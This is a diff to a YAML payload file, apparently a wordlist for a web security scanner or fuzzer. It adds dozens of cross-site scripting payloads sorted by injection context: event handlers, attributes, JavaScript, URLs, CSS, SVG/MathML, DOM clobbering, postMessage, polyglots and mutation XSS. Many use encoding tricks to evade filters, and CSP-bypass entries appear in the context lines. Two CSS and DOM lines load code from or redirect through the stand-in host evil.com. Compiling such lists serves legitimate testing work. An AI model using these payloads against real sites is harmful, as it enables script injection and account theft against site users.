@@ -54,6 +54,129 @@ event_handlers:
 - <bgsound src=javascript:alert(1)>
 - <link rel=import href=data:text/html,<script>alert(1)</script>
 - <base href=javascript:alert(1)//
+# 扩展事件处理器
+- <img src=x onerror=alert(1)>
+- <svg onload=alert(1)>
+- <body onload=alert(1)>
+- <body onpageshow=alert(1)>
+- <body onfocus=alert(1)>
+- <body onhashchange=alert(1)>
+- <body onresize=alert(1)>
+- <body onunload=alert(1)>
+- <input onfocus=alert(1) autofocus>
+- <input onblur=alert(1) tabindex=0 autofocus>
+- <textarea onfocus=alert(1) autofocus></textarea>
+- <select onfocus=alert(1) autofocus></select>
+- <keygen onfocus=alert(1) autofocus>
+- <marquee onstart=alert(1)>
+- <marquee onfinish=alert(1) loop=1>
+- <video src=x onerror=alert(1)>
+- <audio src=x onerror=alert(1)>
+- <source onerror=alert(1)>
+- <details open ontoggle=alert(1)>
+- <meter onmouseover=alert(1)>0</meter>
+- <div onmouseover=alert(1)>hover</div>
+- <div onmouseenter=alert(1)>hover</div>
+- <div onmousemove=alert(1)>hover</div>
+- <div onclick=alert(1)>click</div>
+- <div ondblclick=alert(1)>dblclick</div>
+- <div oncontextmenu=alert(1)>rightclick</div>
+- <div onwheel=alert(1)>scroll</div>
+- <div ondrag=alert(1) draggable=true>drag</div>
+- <div ondragstart=alert(1) draggable=true>drag</div>
+- <div ondragend=alert(1) draggable=true>drag</div>
+- <div ondrop=alert(1)>drop</div>
+- <div ondragover=alert(1)>dragover</div>
+- <div ondragenter=alert(1)>dragenter</div>
+- <div ondragleave=alert(1)>dragleave</div>
+- <div onkeydown=alert(1) tabindex=0>key</div>
+- <div onkeyup=alert(1) tabindex=0>key</div>
+- <div onkeypress=alert(1) tabindex=0>key</div>
+- <div oncopy=alert(1)>copy</div>
+- <div oncut=alert(1)>cut</div>
+- <div onpaste=alert(1)>paste</div>
+- <div onpointerover=alert(1)>ptr</div>
+- <div onpointerenter=alert(1)>ptr</div>
+- <div onpointerdown=alert(1)>ptr</div>
+- <div onpointerup=alert(1)>ptr</div>
+- <div onpointermove=alert(1)>ptr</div>
+- <div ontouchstart=alert(1)>touch</div>
+- <div ontouchmove=alert(1)>touch</div>
+- <div ontouchend=alert(1)>touch</div>
+- <div onanimationstart=alert(1) style="animation:a 1s">anim</div>
+- <div onanimationend=alert(1) style="animation:a 1s">anim</div>
+- <div ontransitionend=alert(1) style="transition:all 0.01s">trans</div>
+- <img src=valid.jpg onload=alert(1)>
+- <input type=text value="" onfocus=alert(1) autofocus>
+- <math><maction actiontype=statusline xlink:href=javascript:alert(1)>click</maction></math>
+attribute_context:
+- '" onfocus=alert(1) autofocus x="'
+- ''' onfocus=alert(1) autofocus x='''
+- '"autofocus onfocus=alert(1) x="'
+- '" onmouseover=alert(1) x="'
+- ''' onmouseover=alert(1) x='''
+- '" onclick=alert(1) x="'
+- ''' onclick=alert(1) x='''
+- '" onfocus="alert(1)" autofocus="'
+- "' onfocus='alert(1)' autofocus='"
+- '" style=animation-name:x onanimationstart=alert(1) x="'
+- '" tabindex=0 onfocus=alert(1) x="'
+- '" accesskey=x onclick=alert(1) x="'
+javascript_context:
+- '</script><script>alert(1)//'
+- '-alert(1)-'
+- '''-alert(1)-'''
+- '"-alert(1)-"'
+- '\';alert(1)//'
+- '";alert(1)//'
+- '};alert(1)//{'''
+- ']-alert(1)-['
+- '</script><img src=x onerror=alert(1)>'
+- '{{constructor.constructor(''alert(1)'')()}}'
+- '${alert(1)}'
+- '`${alert(1)}`'
+- '-eval(''alert(1)'')-'
+- '\x3cscript\x3ealert(1)\x3c/script\x3e'
+- '\u003cscript\u003ealert(1)\u003c/script\u003e'
+url_context:
+- javascript:alert(1)
+- javascript:alert(document.domain)
+- 'javascript://anything%0aalert(1)'
+- 'javascript://comment%0dalert(1)'
+- 'data:text/html,<script>alert(1)</script>'
+- data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+- 'javascript:void(0);alert(1)//'
+- 'java%0ascript:alert(1)'
+- 'java%0dscript:alert(1)'
+- 'java%09script:alert(1)'
+- 'j&#97;v&#97;script:alert(1)'
+- 'ja&#x76;ascript:alert(1)'
+- 'javascript&colon;alert(1)'
+- '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)'
+- 'javascript:alert`1`'
+css_context:
+- 'expression(alert(1))'
+- 'url(javascript:alert(1))'
+- '-moz-binding:url(http://evil.com/xss.xml#xss)'
+- 'behavior:url(xss.htc)'
+- background-image:url(javascript:alert(1))
+- 'list-style-image:url(javascript:alert(1))'
+svg_mathml:
+- <svg><script>alert(1)</script></svg>
+- <svg onload=alert(1)>
+- <svg/onload=alert(1)>
+- <svg><use xlink:href=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=#x></use></svg>
+- <svg><animate attributeName=href values=javascript:alert(1) />
+- <svg><animate xlink:href=#x attributeName=href from=javascript:alert(1) to=1 />
+- <svg><a xlink:href=javascript:alert(1)><rect width=100 height=100/></a></svg>
+- <svg><set attributeName=onmouseover to=alert(1)>
+- <svg><foreignObject><body onload=alert(1)></foreignObject></svg>
+- <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>
+- <svg><image xlink:href=x onerror=alert(1)>
+- <math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+- <math><mtext><img src=x onerror=alert(1)></mtext></math>
+- <math href="javascript:alert(1)">click</math>
+- <math><mi xlink:href="javascript:alert(1)">click</mi></math>
 encoded:
 - '&#60;script&#62;alert(''XSS'')&#60;/script&#62;'
 - '%3Cscript%3Ealert(''XSS'')%3C/script%3E'
@@ -120,6 +243,20 @@ dom_based:
 - '" onfocus=alert(1) autofocus x="'
 - ''' onfocus=alert(1) autofocus x='''
 - '"autofocus onfocus=alert(1) x="'
+# DOM clobbering
+- <form id=x><input name=y>
+- <img name=getElementById>
+- <form><output name=innerHTML>test</output></form>
+# DOM XSS via hash/fragment
+- '#"><img src=x onerror=alert(1)>'
+- '#<svg/onload=alert(1)>'
+- '#javascript:alert(1)'
+- '#?q=<script>alert(1)</script>'
+# DOM XSS via postMessage
+- <iframe srcdoc="<script>parent.postMessage('<img src=x onerror=alert(1)>','*')</script>">
+# DOM XSS via location
+- 'javascript:alert(document.domain)//http://target.com'
+- '//evil.com/redirect?to=javascript:alert(1)'
 polyglot:
 - jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
 - '''"><img src=x onerror=alert(1)//'
@@ -128,6 +265,21 @@ polyglot:
 - '{{constructor.constructor(''alert(1)'')()}}'
 - <svg/onload=alert(1)>
 - '''"><svg/onload=alert(String.fromCharCode(88,83,83))>'
+# 扩展 polyglot
+- "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert())//%0D%0A%0d%0a//<svg/onload=alert()>//"
+- "'\"-->]]>*/</script></style></title></textarea></noscript></template><svg/onload=alert(1)>"
+- "'\"--></title></textarea></style></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+- "<svg onload=alert(1)>\"'--></title></textarea></style></noscript></script>"
+- "';alert(1)//\\';alert(1)//\";alert(1)//\\\"alert(1)//--></script>\">'><script>alert(1)</script>"
+- "'-alert(1)-'\">`<img/src=x onerror=alert(1)><svg/onload=alert(1)>"
+- "<svg/onload=\"alert(1)\"onmouseover=alert(1)//\"onfocus=alert(1)autofocus/>"
+- "{{7*7}}${7*7}<%= 7*7 %>'\"-->]]>*/<script>alert(1)</script>"
+mutation_xss:
+- <noscript><p title="</noscript><img src=x onerror=alert(1)>">
+- <listing>&lt;img src=1 onerror=alert(1)&gt;</listing>
+- <math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
+- <svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
+- <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(1)>"></path></svg></mglyph></mtext></math></form>
 csp_bypass:
 - <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
 - <script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
